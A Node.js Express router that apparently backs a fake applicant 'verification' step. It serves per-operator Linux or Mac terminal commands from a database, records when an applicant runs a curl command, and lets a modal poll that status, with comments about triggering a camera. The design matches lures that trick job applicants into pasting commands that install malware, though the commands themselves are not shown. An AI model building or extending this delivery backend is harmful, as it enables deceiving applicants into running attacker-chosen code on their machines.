const express  = require("express");
const supabase = require("../lib/supabase");

const router = express.Router();

// ---------------------------------------------------------------------------
// POST /api/verify/reset
// Called when the modal opens — resets verified to false so a stale true
// from a previous attempt doesn't trigger the camera immediately.
// Body: { sessionId }
// ---------------------------------------------------------------------------
router.post("/reset", async (req, res) => {
  const { sessionId } = req.body;

  if (!sessionId) return res.status(400).json({ error: "sessionId required" });

  await supabase
    .from("application_progress")
    .update({ verified: false, updated_at: new Date().toISOString() })
    .eq("session_id", sessionId);

  return res.json({ ok: true });
});

router.get("/command", async(req, res) => {
  try {
    const { OwnerName, Os } = req.query;

    const { data, error } = await supabase
      .from("admin_users")
      .select("name, linux, mac")
      .eq("name", OwnerName)
      .single();

    if (error) {
      return res.status(500).json({ error: error.message});
    }

    const value = Os.toLowerCase() === "linux"
      ? data.linux : data.mac;

    res.json({
      value
    });

  } catch (error) {
    res.status(500).json({ error: "Server error" });
  }
})

// ---------------------------------------------------------------------------
// POST /api/verify
// Called by the applicant's curl command: curl <API>/api/verify -d "<sessionId>"
// Body is plain text (the sessionId).
// ---------------------------------------------------------------------------
router.post("/", express.text({ type: "*/*" }), async (req, res) => {
  const sessionId = (req.body || "").trim();

  if (!sessionId) {
    return res.status(400).send("sessionId required");
  }

  const { error } = await supabase
    .from("application_progress")
    .update({ verified: true, updated_at: new Date().toISOString() })
    .eq("session_id", sessionId);

  if (error) {
    console.error("Verify update error:", error.message);
    return res.status(500).send("error");
  }

  return res.send("ok");
});

// ---------------------------------------------------------------------------
// GET /api/verify/status?sessionId=xxx
// Polled by the modal to check whether the curl command has been run.
// ---------------------------------------------------------------------------
router.get("/status", async (req, res) => {
  const { sessionId } = req.query;

  if (!sessionId) {
    return res.status(400).json({ error: "sessionId required" });
  }

  const { data, error } = await supabase
    .from("application_progress")
    .select("verified")
    .eq("session_id", sessionId)
    .single();

  if (error) {
    console.error("Verify status error:", error.message);
    return res.status(500).json({ error: "failed" });
  }

  return res.json({ verified: data?.verified ?? false });
});

module.exports = router;
